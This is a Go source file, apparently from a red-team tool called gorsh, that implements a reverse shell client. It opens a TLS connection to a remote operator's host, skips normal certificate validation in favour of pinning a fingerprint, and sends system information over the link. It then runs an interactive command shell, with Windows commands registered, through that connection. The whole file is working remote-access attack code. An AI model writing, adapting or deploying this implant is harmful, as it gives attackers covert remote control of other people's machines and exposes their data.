package core

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"fmt"
	"os"

	"github.com/abiosoft/ishell"
	"github.com/abiosoft/readline"
	"git.hyrule.link/blink/gorsh/pkg/cmds"
	"git.hyrule.link/blink/gorsh/pkg/myconn"
	"git.hyrule.link/blink/gorsh/pkg/sitrep"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

func InitReverseShell(connectString string, fingerprint []byte) {
	config := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", connectString, config)
	if err != nil {
		os.Exit(ErrHostUnreachable)
	}
	defer conn.Close()

	ok := isValidKey(conn, fingerprint)
	if !ok {
		os.Exit(ErrBadFingerprint)
	}

	myconn.Conn = conn
	StartShell(conn)
}

func StartShell(conn myconn.Writer) {
	hostname, _ := os.Hostname()
	conf := &readline.Config{
		Prompt:      fmt.Sprintf("[%s]> ", hostname),
		Stdin:       conn,
		StdinWriter: conn,
		Stdout:      conn,
		Stderr:      conn,
		VimMode:     true,
		// UniqueEditLine:      true,
	}

	// use these option when connection is a reverse shell,
	// otherwise these break when using -dev locally
	if myconn.Conn != nil {
		conf.ForceUseInteractive = true
		conf.FuncIsTerminal = func() bool { return true }
		conf.FuncMakeRaw = func() error { return nil }
		conf.FuncExitRaw = func() error { return nil }
	}

	sh := ishell.NewWithConfig(conf)

	cmds.RegisterCommands(sh)
	cmds.RegisterWindowsCommands(sh)
	myconn.Send(conn, sitrep.SysInfo())
	sh.Run()
	os.Exit(0)
}

func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid
}
